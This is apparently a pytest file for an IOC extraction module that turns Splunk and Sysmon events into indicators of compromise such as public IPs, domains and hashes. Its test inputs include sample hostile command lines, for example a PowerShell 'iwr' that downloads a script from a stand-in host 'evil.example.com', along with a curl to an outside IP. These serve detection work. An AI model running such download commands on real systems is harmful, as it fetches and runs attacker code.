from app.normalization.ioc import defang, extract_iocs, ioc_kind, public_domain, public_ip
from app.normalization.mappers import to_canonical


def test_public_ip_rejects_all_non_global_ranges():
    for bad in ("10.1.1.1", "192.168.0.5", "172.20.1.1", "127.0.0.1", "169.254.3.3",
                "100.64.0.1", "224.0.0.251", "::1", "fe80::1", "0.0.0.0", "not-an-ip", None, "-"):
        assert public_ip(bad) is None, bad
    assert public_ip("8.8.8.8") == "8.8.8.8"
    assert public_ip("::ffff:8.8.4.4") == "8.8.4.4"
    assert public_ip("2606:4700::1111") == "2606:4700::1111"


def test_public_domain_uses_public_suffix_list():
    assert public_domain("Raw.GitHubUserContent.com.") == "raw.githubusercontent.com"
    assert public_domain("wpad") is None
    assert public_domain("printer.corp.local") is None
    assert public_domain("calc.exe") is None
    assert public_domain("script.py") is None
    assert public_domain("script.py", allow_file_tlds=True) == "script.py"
    assert public_domain("evil.co.uk") == "evil.co.uk"


def test_defang():
    assert defang("hxxps://evil[.]com/x") == "https://evil.com/x"


def test_ioc_kind():
    assert ioc_kind("8.8.8.8") == "ip"
    assert ioc_kind("a" * 64) == "hash"
    assert ioc_kind("evil.com") == "domain"


def test_dns_event_yields_domain_and_public_resolved_ips(splunk_rows):
    ev = to_canonical(splunk_rows["22"][0])
    iocs = extract_iocs(ev)
    assert "raw.githubusercontent.com" in iocs
    assert "185.199.109.133" in iocs


def test_network_event_yields_public_destination_only(splunk_rows):
    ev = to_canonical(splunk_rows["3"][0])
    iocs = extract_iocs(ev)
    assert "34.206.0.173" in iocs
    assert not any(i.startswith("10.") for i in iocs)


def test_command_line_urls_and_ips_are_extracted():
    ev = to_canonical({
        "_time": "2026-08-11T06:37:25Z", "EventCode": "1",
        "CommandLine": "powershell iwr hxxp://evil[.]example.com/a.ps1 -o x; curl 45.33.32.157; python tool.py 10.0.0.2",
    })
    iocs = extract_iocs(ev)
    assert "evil.example.com" in iocs
    assert "45.33.32.157" in iocs
    assert "10.0.0.2" not in iocs
    assert "tool.py" not in iocs


def test_benign_domain_filter_is_applied_but_ips_remain(splunk_rows):
    ev = to_canonical(splunk_rows["22"][0])
    iocs = extract_iocs(ev, is_benign_domain=lambda d: d.endswith("githubusercontent.com"))
    assert "raw.githubusercontent.com" not in iocs
    assert "185.199.109.133" in iocs


def test_sha256_preferred_over_md5():
    ev = to_canonical({"_time": "2026-08-11T06:37:25Z", "EventCode": "1",
                       "Hashes": "MD5=" + "a" * 32 + ",SHA256=" + "b" * 64})
    assert extract_iocs(ev) == ["b" * 64]


def test_script_code_does_not_produce_pseudo_domains():
    from app.normalization.ioc import _text_iocs

    assert _text_iocs("$ms.Seek(0); New-Object -ComObject WScript.Shell; $service.Name") == []


def test_real_domains_in_command_lines_are_still_extracted():
    from app.normalization.ioc import _text_iocs

    assert "evil.example.com" in _text_iocs("iwr http://evil.example.com/a.ps1")
    assert _text_iocs("ping evil.example.com") == ["evil.example.com"]
    assert _text_iocs("nslookup c2.example.org") == ["c2.example.org"]


def test_real_4104_rows_yield_no_pseudo_tld_domains(splunk_rows):
    for row in splunk_rows["4104"]:
        iocs = extract_iocs(to_canonical(row))
        assert not [i for i in iocs if i.endswith((".shell", ".seek", ".name"))], iocs
